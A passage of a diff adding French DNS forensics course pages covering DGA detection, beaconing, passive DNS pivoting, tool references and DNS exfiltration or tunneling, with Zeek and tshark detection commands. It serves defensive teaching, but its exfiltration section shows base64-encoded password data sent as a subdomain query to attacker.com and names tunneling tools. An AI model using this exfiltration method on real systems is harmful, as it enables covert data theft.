+  Les attaquants ont besoin que leur malware puisse toujours joindre le serveur C2, même si des domaines sont bloqués. Deux techniques : le <strong>DGA (Domain Generation Algorithm)</strong> génère des milliers de domaines pseudo-aléatoires, dont seuls quelques-uns sont enregistrés — le malware les essaie jusqu'à en trouver un actif. Le <strong>beaconing</strong> est la communication périodique régulière du malware avec son C2, visible dans les logs DNS sous forme d'un battement régulier.
+</div>
+
+<!-- DGA -->
+<div class="sec-title">DGA — Domain Generation Algorithm</div>
+<div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.65rem;margin:.75rem 0">
+  <div class="card card-red">
+    <div class="ct">🎲 Comment fonctionne un DGA</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      Le malware calcule des noms de domaine à partir d'une <strong>graine (seed)</strong> — souvent la date du jour. L'attaquant enregistre à l'avance 1-2 des milliers de domaines générés. Le malware essaie chaque domaine jusqu'à en trouver un actif.<br><br>
+      <strong>Résultat forensique</strong> : <strong>des centaines de NXDOMAIN</strong> (domaine inexistant) suivis d'une connexion réussie = signature DGA très reconnaissable.
+    </div>
+  </div>
+  <div class="card card-gold">
+    <div class="ct">🔍 Détection DGA dans les logs</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>Indicateurs :</strong><br>
+      · Ratio NXDOMAIN &gt; 50% pour un client<br>
+      · Domaines à haute entropie (consonnes/voyelles inhabituelles)<br>
+      · Même longueur de domaine en série<br>
+      · Même TLD en série (.com, .net, .org alternant)<br><br>
+      <strong>Outils :</strong> DGArchive (base de DGA connus) · dgaintel · scikit-learn (ML sur entropie)
+    </div>
+  </div>
+</div>
+
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;margin:.75rem 0;font-family:var(--mono);font-size:.68rem;line-height:1.9;color:var(--text)">
+  <span style="color:var(--cyan)"># Exemples de domaines DGA réels (Conficker, Emotet)</span><br>
+  tnhdlfspqv.com  <span style="color:var(--dim)"># NXDOMAIN</span><br>
+  kwrxbmzgpa.net  <span style="color:var(--dim)"># NXDOMAIN</span><br>
+  yvfmcqhtsj.org  <span style="color:var(--dim)"># NXDOMAIN</span><br>
+  ...             <span style="color:var(--dim)"># 300 essais...</span><br>
+  abxkcmfght.com  <span style="color:var(--dim)"># → 185.x.x.x SUCCÈS = C2 actif</span><br><br>
+  <span style="color:var(--cyan)"># Détecter dans Zeek — ratio NXDOMAIN par client</span><br>
+  cat dns.log | zeek-cut id.orig_h rcode_name |<br>
+  &nbsp;&nbsp;awk '{count[$1"_"$2]++} END {for(k in count) print count[k], k}' |<br>
+  &nbsp;&nbsp;grep NXDOMAIN | sort -rn | head -20<br><br>
+  <span style="color:var(--cyan)"># Calculer l'entropie d'un domaine (python)</span><br>
+  python3 -c "import math; d='tnhdlfspqv'; e=-sum(d.count(c)/len(d)*math.log2(d.count(c)/len(d)) for c in set(d)); print(f'Entropie: {e:.2f}')"
+</div>
+
+<!-- Beaconing -->
+<div class="sec-title">DNS Beaconing — Détection des communications C2 périodiques</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Indicateur</th><th>Trafic DNS normal</th><th>Beaconing C2</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Intervalle</td>
+      <td style="font-size:.74rem">Aléatoire selon l'utilisation</td>
+      <td style="font-size:.74rem;color:var(--red)">Régulier : 30s, 60s, 5min, 15min — comme une horloge</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Domaine cible</td>
+      <td style="font-size:.74rem">Diversifié selon la navigation</td>
+      <td style="font-size:.74rem;color:var(--red)">Unique ou très limité, souvent inconnu</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Réponse IP</td>
+      <td style="font-size:.74rem">IP stable (CDN, serveur fixe)</td>
+      <td style="font-size:.74rem;color:var(--red)">IP changeante à chaque résolution (Fast Flux) ou NXDOMAIN alternant</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">TTL des réponses</td>
+      <td style="font-size:.74rem">300s–86400s selon le service</td>
+      <td style="font-size:.74rem;color:var(--red)">TTL très bas (&lt; 30s) — infrastructure éphémère</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Heure d'activité</td>
+      <td style="font-size:.74rem">Pendant les heures de bureau</td>
+      <td style="font-size:.74rem;color:var(--red)">24h/24 y compris nuit et week-end</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Origine</td>
+      <td style="font-size:.74rem">Plusieurs utilisateurs/processus</td>
+      <td style="font-size:.74rem;color:var(--red)">Un seul processus ou une seule IP source</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;margin:.75rem 0;font-family:var(--mono);font-size:.68rem;line-height:1.9;color:var(--text)">
+  <span style="color:var(--cyan)"># Détecter beaconing — requêtes régulières vers même domaine</span><br>
+  tshark -r capture.pcap -T fields -e frame.time_epoch -e dns.qry.name \<br>
+  &nbsp;&nbsp;-Y "dns.flags.response==0" |<br>
+  &nbsp;&nbsp;awk '{print $2, $1}' | sort | uniq -c<br><br>
+  <span style="color:var(--cyan)"># Analyser les intervalles entre requêtes vers un domaine</span><br>
+  cat dns.log | zeek-cut ts query | grep "evil.com" |<br>
+  &nbsp;&nbsp;awk 'prev{printf "%.0f\n", $1-prev} {prev=$1}' |<br>
+  &nbsp;&nbsp;sort | uniq -c | sort -rn<br><br>
+  <span style="color:var(--cyan"># Un pic à 60 secondes = beacon toutes les 60s</span>
+</div>
+
+<div class="key-fact">
+  <div class="key-fact-label">🎯 Jitter — Technique d'évasion anti-détection</div>
+  <div style="font-size:.78rem;line-height:1.75;margin-top:.4rem;color:var(--muted)">
+    Les beacons modernes (Cobalt Strike, Sliver) introduisent un <strong>jitter</strong> — une variation aléatoire de ±20-50% de l'intervalle — pour éviter la détection par des intervalles parfaitement réguliers. Un beacon configuré à 60s avec 30% de jitter sonnera entre 42s et 78s. La détection nécessite donc une analyse statistique (écart-type, distribution des intervalles) plutôt qu'une recherche d'intervalle fixe.
+  </div>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Les logs DNS montrent que le poste 10.0.1.22 a effectué 1847 requêtes NXDOMAIN vers des domaines comme <code>xkqpvtmzbn.com</code>, <code>rvlhcqsmfw.net</code>, <code>gptkzxmvbd.org</code> en 3 heures, puis une connexion réussie vers <code>amzpvkrtxs.com</code> → 91.197.x.x. Identifier la technique et les étapes d'investigation.<small>DGA · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">
+    <strong>Technique : DGA (Domain Generation Algorithm)</strong><br><br>
+    <strong>Signature confirmée :</strong><br>
+    · 1847 NXDOMAIN = le malware essaie des milliers de domaines générés algorithmiquement<br>
+    · Domaines à haute entropie (consonnes/voyelles inhabituelles, pas de mots lisibles)<br>
+    · TLDs variés (.com, .net, .org) = caractéristique DGA<br>
+    · 1 domaine résout finalement = le seul enregistré par l'attaquant ce jour-là<br><br>
+    <strong>Investigation :</strong><br>
+    1. Soumettre les domaines à <strong>DGArchive</strong> (dgarchive.caad.fkie.fraunhofer.de) → identifier la famille DGA (Conficker, Emotet, Dridex…)<br>
+    2. Rechercher 91.197.x.x dans VirusTotal, Shodan, AbuseIPDB → infrastructure C2 connue ?<br>
+    3. Sur le poste 10.0.1.22 : Sysmon EID 22 (DNS query) pour identifier le processus à l'origine → PID → processus parent → chaîne d'infection<br>
+    4. Chercher le même pattern DGA sur tous les postes du réseau (spreading ?)<br>
+    5. Acquérir la RAM du poste — le malware DGA est souvent fileless
+  </div>
+</div>
+</div><!-- /tab-dga -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 4 — PASSIVE DNS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-passive">
+
+<div class="concept-card">
+  <div class="concept-title">🔭 Passive DNS — Mémoire historique du système de noms</div>
+  Le <strong>Passive DNS</strong> est une technique de collecte passive qui enregistre les réponses DNS observées sur le réseau mondial au fil du temps. Ces bases de données permettent de savoir <strong>quelle IP un domaine résolvait à une date précise</strong>, ou <strong>quels domaines ont pointé vers une IP donnée</strong>. C'est un outil d'investigation rétrospective indispensable — il permet de retracer l'infrastructure d'un attaquant même des années après l'incident.
+</div>
+
+<div class="sec-title">Services Passive DNS — Comparatif</div>
+<div class="tool-grid">
+
+  <div class="tool-card" style="border-left:3px solid var(--red)">
+    <div class="tool-name">VirusTotal</div>
+    <div class="tool-by">Google (gratuit/payant)</div>
+    <div class="tool-desc">Relations DNS historiques, résolutions, sous-domaines, communicating files. Onglet "Relations" d'un domaine ou d'une IP. API disponible. Limite : 4 requêtes/min gratuit.</div>
+    <div><span class="tool-tag tt-free">Gratuit limité</span><span class="tool-tag tt-gui">Web + API</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--gold)">
+    <div class="tool-name">DNSDB (Farsight)</div>
+    <div class="tool-by">Farsight Security</div>
+    <div class="tool-desc">La base Passive DNS la plus complète. Milliards d'enregistrements. API REST. Queries par domaine, IP, CIDR. Résultats avec timestamps first_seen/last_seen. Standard industriel.</div>
+    <div><span class="tool-tag tt-com">Payant</span><span class="tool-tag tt-cmd">API</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--cyan)">
+    <div class="tool-name">SecurityTrails</div>
+    <div class="tool-by">Recorded Future</div>
+    <div class="tool-desc">Historique DNS, sous-domaines, WHOIS historique, MX records. Interface web intuitive. 50 requêtes/mois gratuit. Bon pour les investigations ponctuelles.</div>
+    <div><span class="tool-tag tt-free">Freemium</span><span class="tool-tag tt-gui">Web + API</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--purple)">
+    <div class="tool-name">Shodan</div>
+    <div class="tool-by">Shodan Inc.</div>
+    <div class="tool-desc">DNS inversé par IP, historique des bannières, certificats TLS. Idéal pour identifier toute l'infrastructure associée à une IP C2. Croisement avec Censys pour confirmation.</div>
+    <div><span class="tool-tag tt-free">Freemium</span><span class="tool-tag tt-gui">Web + API</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--green)">
+    <div class="tool-name">RiskIQ / Defender TI</div>
+    <div class="tool-by">Microsoft</div>
+    <div class="tool-desc">Passive DNS + Threat Intelligence intégrée. Pivotage sur IP, domaine, certificats, hashes. Intégré à Microsoft Sentinel. Excellent pour les pivots d'infrastructure complexes.</div>
+    <div><span class="tool-tag tt-com">Payant</span><span class="tool-tag tt-gui">Web + API</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--blue)">
+    <div class="tool-name">DNStwist</div>
+    <div class="tool-by">Open Source</div>
+    <div class="tool-desc">Génère et vérifie les variantes typosquattées d'un domaine (transpositions, homoglyphes, ajouts). Détecte les domaines frauduleux imitant un domaine légitime. Idéal pour les cas BEC/phishing.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+</div>
+
+<!-- Pivotage -->
+<div class="sec-title">Pivotage Passive DNS — Reconstituer l'infrastructure d'un attaquant</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+  <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-bottom:.75rem;letter-spacing:.05em;text-transform:uppercase">MÉTHODOLOGIE DE PIVOTAGE — EXEMPLE PAS À PAS</div>
+
+  <div style="display:grid!important;grid-template-columns:32px 1fr;gap:.5rem;align-items:start;margin-bottom:.65rem">
+    <div style="font-family:var(--mono);font-size:.8rem;font-weight:700;color:var(--cyan)">1</div>
+    <div style="font-size:.74rem;color:var(--muted)"><strong>Domaine initial</strong> : <code>updates-microsoft.net</code> trouvé dans les logs DNS. → VirusTotal : premier vu le 2024-01-15, résout vers <strong>185.234.x.x</strong></div>
+  </div>
+  <div style="display:grid!important;grid-template-columns:32px 1fr;gap:.5rem;align-items:start;margin-bottom:.65rem">
+    <div style="font-family:var(--mono);font-size:.8rem;font-weight:700;color:var(--gold)">2</div>
+    <div style="font-size:.74rem;color:var(--muted)"><strong>Pivot IP</strong> : Qui d'autre a résolu vers 185.234.x.x ? → DNSDB : 12 autres domaines suspects sur la même IP → même acteur, même infrastructure</div>
+  </div>
+  <div style="display:grid!important;grid-template-columns:32px 1fr;gap:.5rem;align-items:start;margin-bottom:.65rem">
+    <div style="font-family:var(--mono);font-size:.8rem;font-weight:700;color:var(--purple)">3</div>
+    <div style="font-size:.74rem;color:var(--muted)"><strong>Pivot certificat TLS</strong> : Shodan montre que 185.234.x.x expose un certificat TLS avec CN=<em>cobalt-strike-team-server</em> → C2 Cobalt Strike confirmé</div>
+  </div>
+  <div style="display:grid!important;grid-template-columns:32px 1fr;gap:.5rem;align-items:start;margin-bottom:.65rem">
+    <div style="font-family:var(--mono);font-size:.8rem;font-weight:700;color:var(--green)">4</div>
+    <div style="font-size:.74rem;color:var(--muted)"><strong>Pivot WHOIS</strong> : Email registrant = <em>attacker@protonmail.com</em> → autres domaines enregistrés avec ce même email → cluster d'infrastructure</div>
+  </div>
+  <div style="display:grid!important;grid-template-columns:32px 1fr;gap:.5rem;align-items:start">
+    <div style="font-family:var(--mono);font-size:.8rem;font-weight:700;color:var(--red)">5</div>
+    <div style="font-size:.74rem;color:var(--muted)"><strong>Timeline</strong> : SecurityTrails montre que le domaine a été créé 3 jours avant l'incident → préparation délibérée. Corrélé avec la date d'accès initial dans les logs VPN.</div>
+  </div>
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>🔍 Questions forensiques Passive DNS</h4>
+    <ul class="memo-list">
+      <li>Quand ce domaine a-t-il été enregistré ? (âge = signal de risque)</li>
+      <li>Vers quelle(s) IP ce domaine a-t-il résolu historiquement ?</li>
+      <li>Quels autres domaines partagent cette IP ? (infrastructure commune)</li>
+      <li>Ce domaine est-il classé malveillant sur VT, URLhaus, PhishTank ?</li>
+      <li>Le certificat TLS contient-il des anomalies (CN, organisation) ?</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>⚠️ Limites du Passive DNS</h4>
+    <ul class="memo-list">
+      <li>Ne couvre pas les requêtes DNS internes (réseau privé)</li>
+      <li>DoH/DoT → trafic chiffré invisible aux sondes Passive DNS</li>
+      <li>Domaines éphémères (quelques heures) peuvent ne pas être indexés</li>
+      <li>Résolutions sur IPv6 sous-représentées dans certaines bases</li>
+      <li>Données incomplètes selon la couverture géographique des sondes</li>
+    </ul>
+  </div>
+</div>
+</div><!-- /tab-passive -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 5 — OUTILS & ANALYSE
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-outils">
+
+<div class="sec-title">Outils DNS forensiques — Référence</div>
+<div class="tool-grid">
+
+  <div class="tool-card" style="border-left:3px solid var(--cyan)">
+    <div class="tool-name">Zeek (Bro)</div>
+    <div class="tool-by">Zeek Project / CNCF</div>
+    <div class="tool-desc">Analyse PCAP → dns.log structuré (TSV/JSON). Champs : ts, uid, orig_h, resp_h, proto, query, qtype, answers, TTL, rcode. Référence absolue en forensique réseau. Scripts personnalisables.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--gold)">
+    <div class="tool-name">tshark / Wireshark</div>
+    <div class="tool-by">Wireshark Foundation</div>
+    <div class="tool-desc">Extraction DNS depuis PCAP. <code>tshark -r cap.pcap -T fields -e dns.qry.name -Y "dns"</code>. Filtres puissants. Reconstruction des sessions DNS. Détection anomalies par volume.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI + GUI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--purple)">
+    <div class="tool-name">Sysmon EID 22</div>
+    <div class="tool-by">Microsoft / Sysinternals</div>
+    <div class="tool-desc">Event ID 22 : DNSEvent — log de chaque requête DNS par processus sur Windows. Inclut : QueryName, QueryResults, ProcessId, Image. Permet d'attribuer une requête DNS à un processus précis.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-gui">Windows</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--blue)">
+    <div class="tool-name">DNStwist</div>
+    <div class="tool-by">Open Source</div>
+    <div class="tool-desc">Génère toutes les variantes typosquattées d'un domaine (transpositions, homoglyphes, omissions). Vérifie lesquelles sont enregistrées et actives. Idéal phishing/BEC.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--green)">
+    <div class="tool-name">Arkime (Moloch)</div>
+    <div class="tool-by">AOL / Open Source</div>
+    <div class="tool-desc">Capture et indexation de trafic réseau à grande échelle. Interface web pour rechercher dans des mois de PCAP. DNS, HTTP, TLS indexés. Standard dans les grandes équipes SOC/DFIR.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-gui">GUI + API</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--red)">
+    <div class="tool-name">DGArchive</div>
+    <div class="tool-by">Fraunhofer FKIE</div>
+    <div class="tool-desc">Base de données de 100+ algorithmes DGA connus. Permet d'identifier la famille malware associée à un domaine DGA. Interface web et API. Gratuit pour la recherche.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-gui">Web + API</span></div>
+  </div>
+
+</div>
+
+<!-- Workflow complet -->
+<div class="sec-title">Workflow DNS forensique — Du PCAP au rapport</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+  <div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.5rem">
+
+    <div style="background:rgba(0,229,204,.04);border:1px solid rgba(0,229,204,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--cyan);font-weight:700;margin-bottom:.35rem">1. Extraction depuis PCAP</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.8;display:block">zeek -r capture.pcap<br>ls *.log  <span style="color:var(--dim)"># → dns.log, http.log…</span><br>cat dns.log | zeek-cut query answers rcode_name</code>
+    </div>
+
+    <div style="background:rgba(240,192,64,.04);border:1px solid rgba(240,192,64,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--gold);font-weight:700;margin-bottom:.35rem">2. Top domaines par volume</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.8;display:block">cat dns.log | zeek-cut query |<br>&nbsp;&nbsp;sort | uniq -c | sort -rn | head -30<br><span style="color:var(--dim)"># Domaine #1 avec 5000 req → suspect</span></code>
+    </div>
+
+    <div style="background:rgba(255,64,96,.04);border:1px solid rgba(255,64,96,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--red);font-weight:700;margin-bottom:.35rem">3. Détection anomalies</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.8;display:block"><span style="color:var(--dim)"># Labels longs (exfiltration)</span><br>awk '{n=split($0,a,"."); if(length(a[1])>30) print}' dns.log<br><span style="color:var(--dim"># NXDOMAIN en masse (DGA)</span><br>grep "NXDOMAIN" dns.log | wc -l</code>
+    </div>
+
+    <div style="background:rgba(48,232,138,.04);border:1px solid rgba(48,232,138,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--green);font-weight:700;margin-bottom:.35rem">4. Pivot & enrichissement</div>
+      <code style="font-size:.65rem;color:var(--text);line-height:1.8;display:block"><span style="color:var(--dim)"># VirusTotal API</span><br>curl "https://www.virustotal.com/api/v3/domains/evil.com" \<br>&nbsp;&nbsp;-H "x-apikey: YOUR_KEY"<br><span style="color:var(--dim"># Shodan</span><br>shodan host 185.234.x.x</code>
+    </div>
+
+  </div>
+</div>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Exam Tip — DNS Forensique</div>
+  <p><strong>DNS = souvent seul protocole non filtré en sortie</strong> → vecteur privilégié exfiltration et C2</p>
+  <p><strong>Exfiltration DNS</strong> = données Base64 dans sous-domaines · labels &gt; 30 chars · types TXT/NULL/CNAME</p>
+  <p><strong>DGA</strong> = centaines de NXDOMAIN suivis d'une connexion réussie · domaines à haute entropie</p>
+  <p><strong>Beaconing</strong> = requêtes périodiques régulières · TTL très bas (&lt; 30s) · actif 24h/24</p>
+  <p><strong>Fast Flux</strong> = IP change à chaque résolution (TTL très bas) · résistance au blocage</p>
+  <p><strong>Passive DNS</strong> = résolutions historiques · VirusTotal (gratuit) · DNSDB (payant, le plus complet)</p>
+  <p><strong>Zeek dns.log</strong> = source principale · champs clés : ts, id.orig_h, query, qtype_name, answers, rcode_name</p>
+  <p><strong>Sysmon EID 22</strong> = DNSEvent → attribuer une requête DNS à un processus Windows précis</p>
+  <p><strong>DoH/DoT</strong> = angle mort majeur → trafic DNS chiffré port 443 invisible aux logs DNS classiques</p>
+</div>
+</div><!-- /tab-outils -->
+
 <script>
-const b=document.getElementById('scroll-top');window.addEventListener('scroll',()=>b.classList.toggle('visible',window.scrollY>300));
+// ── Tabs ──
+function showTab(id, btn) {
+  document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('.tab').forEach(function(b){b.classList.remove('active');});
+  var el = document.getElementById('tab-'+id);
+  if(el) el.classList.add('active');
+  if(btn) btn.classList.add('active');
+}
+
+// ── Quiz ──
+document.addEventListener('click', function(e) {
+  if(e.target && e.target.classList.contains('quiz-reveal-btn')) {
+    var wrap = e.target.closest('.quiz-wrap');
+    if(!wrap) return;
+    var ans = wrap.querySelector('.quiz-answer');
+    if(ans) ans.style.display = ans.style.display === 'block' ? 'none' : 'block';
+  }
+});
+
+// ── Source details ──
+var sourceDetails = {
+  windows: {
+    icon:'🪟', title:'Windows DNS Server — Logs et forensique',
+    body:`<strong>Event Log DNS (Viewer)</strong> : canal <em>DNS Server</em> dans l'Observateur d'événements. Événements clés :<br>
+    · <strong>EID 150</strong> : requête DNS reçue (si debug logging activé)<br>
+    · <strong>EID 407</strong> : mise à jour de zone<br>
+    · <strong>EID 6001</strong> : démarrage du service DNS<br><br>
+    <strong>Debug Log</strong> : <code>%SystemRoot%\System32\dns\dns.log</code> — format texte avec timestamp, client IP, type de requête, nom, réponse.<br>
+    Activation : DNS Manager → Propriétés serveur → Debug Logging, ou <code>Set-DnsServerDiagnostics -All $true</code>.<br><br>
+    <strong>ETW (Event Tracing for Windows)</strong> : trace kernel-level, plus performante. Provider : <code>Microsoft-Windows-DNS-Client</code>.<br><br>
+    <strong>Limitation forensique</strong> : le debug log est désactivé par défaut et génère beaucoup d'I/O. Les logs sont souvent absents lors d'un incident.`
+  },
+  zeek: {
+    icon:'🦡', title:'Zeek dns.log — Format et champs clés',
+    body:`<strong>Format</strong> : TSV ou JSON. Un enregistrement par transaction DNS (requête + réponse).<br><br>
+    <strong>Champs forensiques essentiels</strong> :<br>
+    · <code>ts</code> : timestamp Unix<br>
+    · <code>id.orig_h</code> : IP source (client)<br>
+    · <code>id.resp_h</code> : IP du résolveur<br>
+    · <code>proto</code> : udp ou tcp<br>
+    · <code>query</code> : nom de domaine demandé<br>
+    · <code>qtype_name</code> : A, AAAA, MX, TXT, CNAME, NULL…<br>
+    · <code>answers</code> : réponses (IPs, CNAME targets)<br>
+    · <code>TTL</code> : Time-To-Live de la réponse<br>
+    · <code>rcode_name</code> : NOERROR, NXDOMAIN, SERVFAIL…<br><br>
+    <strong>Commandes de base</strong> :<br>
+    <code>cat dns.log | zeek-cut query answers | head -50</code><br>
+    <code>zeek -r capture.pcap</code> → génère tous les logs automatiquement`
+  },
+  firewall: {
+    icon:'🔥', title:'Firewall / Pi-hole — DNS applicatif',
+    body:`<strong>Pi-hole</strong> : résolveur DNS avec liste noire. Logs dans <code>/var/log/pihole.log</code> ou via l'interface web. Très utile pour les réseaux domestiques et PME. Montre les domaines bloqués par client.<br><br>
+    <strong>pfSense / OPNsense</strong> : DNS Resolver (Unbound) loggue dans syslog. Peut être configuré pour envoyer vers un SIEM (ELK, Splunk).<br><br>
+    <strong>Fortigate DNS Filter</strong> : logs des requêtes filtrées avec catégorie (C2, malware, phishing) et action (block/allow).<br><br>
+    <strong>Limitation majeure</strong> : un attaquant peut bypasser le résolveur interne en configurant 8.8.8.8 directement dans son outil. Détecter ces requêtes directes en cherchant du trafic UDP/TCP port 53 <em>ne passant pas</em> par le résolveur interne.`
+  },
+  pcap: {
+    icon:'📦', title:'PCAP port 53 — Capture complète',
+    body:`<strong>Capture ciblée DNS</strong> :<br>
+    <code>tcpdump -i eth0 -w dns.pcap port 53</code><br>
+    <code>tshark -i eth0 -f "port 53" -w dns.pcap</code><br><br>
+    <strong>Analyse depuis PCAP</strong> :<br>
+    <code>tshark -r dns.pcap -T fields -e dns.qry.name -Y "dns.flags.response==0" | sort -u</code><br><br>
+    <strong>Avantages</strong> : capture tout (y compris les requêtes bypassing résolveur interne), payload complet.<br><br>
+    <strong>Limitations</strong> :<br>
+    · Stockage élevé (rotation rapide)<br>
+    · DoH port 443 invisible<br>
+    · Nécessite TAP ou port SPAN sur l'infrastructure réseau<br>
+    · DNS over TLS port 853 = chiffré`
+  },
+  cloud: {
+    icon:'☁️', title:'Cloud DNS — Azure, AWS, GCP',
+    body:`<strong>Azure DNS</strong> : logs via Azure Monitor / Log Analytics. Requêtes vers les zones DNS hébergées. Requêtes privées (zones DNS privées) depuis les VNets.<br><br>
+    <strong>AWS Route 53</strong> : Query Logging activable par zone. Logs vers CloudWatch ou S3. Inclut : timestamp, domaine, type, réponse, IP source.<br>
+    <code>aws route53 list-query-logging-configs</code><br><br>
+    <strong>GCP Cloud DNS</strong> : logs vers Cloud Logging. Filtrable par projet, zone, réponse.<br><br>
+    <strong>Valeur forensique</strong> : les logs DNS cloud révèlent les requêtes depuis les workloads cloud (VM, containers, fonctions) — une source souvent oubliée lors d'investigations impliquant des ressources cloud compromises.`
+  },
+  passive: {
+    icon:'🔭', title:'Passive DNS externe — Résolutions historiques',
+    body:`<strong>Principe</strong> : des sondes mondiales enregistrent passivement les réponses DNS observées. Ces données permettent de reconstituer l'historique des résolutions DNS sans avoir été présent au moment de l'incident.<br><br>
+    <strong>Cas d'usage forensiques</strong> :<br>
+    · Un domaine C2 a changé d'IP → le Passive DNS montre l'IP précédente<br>
+    · Identifier d'autres domaines malveillants sur la même IP (cluster)<br>
+    · Confirmer la date de première utilisation d'un domaine (âge = indicateur)<br>
+    · Retrouver des domaines supprimés qui ne résolvent plus<br><br>
+    <strong>Services clés</strong> : VirusTotal (gratuit, limité), DNSDB Farsight (payant, le plus complet), SecurityTrails (freemium), Censys, Shodan.`
+  }
+};
+
+function showSource(key) {
+  var d = sourceDetails[key];
+  if(!d) return;
+  var p = document.getElementById('source-detail');
+  p.className = 'arch-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.title+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+// ── Exfiltration techniques ──
+var exfilDetails = {
+  subdomain: {
+    icon:'📤', name:'Exfiltration par sous-domaines (Base64)',
+    body:`<strong>Mécanisme</strong> : les données à exfiltrer sont découpées en chunks, encodées en Base64, et utilisées comme labels de sous-domaines. L'attaquant contrôle le serveur DNS autoritaire du domaine et reçoit les données via les logs de requêtes.<br><br>
+    <strong>Exemple</strong> :<br>
+    Données : "motdepasse123"<br>
+    Base64 : <code>bW90ZGVwYXNzZTEyMw==</code><br>
+    Requête : <code>bW90ZGVwYXNzZTEyMw.attacker.com</code><br><br>
+    <strong>Outils offensifs</strong> : DNScat2, iodine, custom scripts Python<br><br>
+    <strong>IOCs forensiques</strong> :<br>
+    · Labels &gt; 30 caractères dans les requêtes<br>
+    · Caractères Base64 (A-Z, a-z, 0-9, +, /, =)<br>
+    · Volume élevé de requêtes vers un seul domaine<br>
+    · Le domaine ne répond souvent qu'avec NXDOMAIN ou une IP bidon`
+  },
+  tunneling: {
+    icon:'🚇', name:'Tunneling DNS — Protocole complet dans DNS',
+    body:`<strong>Mécanisme</strong> : un protocole entier (TCP, SSH, HTTP) est encapsulé dans les échanges DNS. Permet de bypasser un firewall qui bloque tout sauf le DNS. L'attaquant a un client (sur la victime) et un serveur (sur son infrastructure).<br><br>
+    <strong>Outils courants</strong> :<br>
+    · <strong>iodine</strong> : tunnel IP dans DNS · crée une interface réseau<br>
+    · <strong>dns2tcp</strong> : tunnel TCP dans DNS<br>
+    · <strong>DNScat2</strong> : shell C2 complet dans DNS<br><br>
+    <strong>IOCs — Volume anormal</strong> :<br>
+    · Centaines de requêtes/minute depuis un seul client<br>
+    · Taille des réponses TXT anormalement grande (512+ bytes)<br>
+    · Latence élevée (le tunnel DNS est lent)<br>
+    · Types NULL, CNAME, MX en grande quantité (porteurs de données)`
+  },
+  c2: {
+    icon:'📡', name:'C2 via réponses DNS TXT/NULL',
+    body:`<strong>Mécanisme</strong> : les instructions C2 sont encodées dans les réponses DNS (champs TXT, NULL, ou CNAME). Le malware fait des requêtes DNS régulières et lit les réponses pour recevoir ses ordres.<br><br>
+    <strong>Avantage</strong> : les réponses DNS semblent légitimes (toujours du DNS normal). Le trafic ressemble à du beaconing standard.<br><br>
+    <strong>Exemples de frameworks C2 utilisant DNS</strong> :<br>
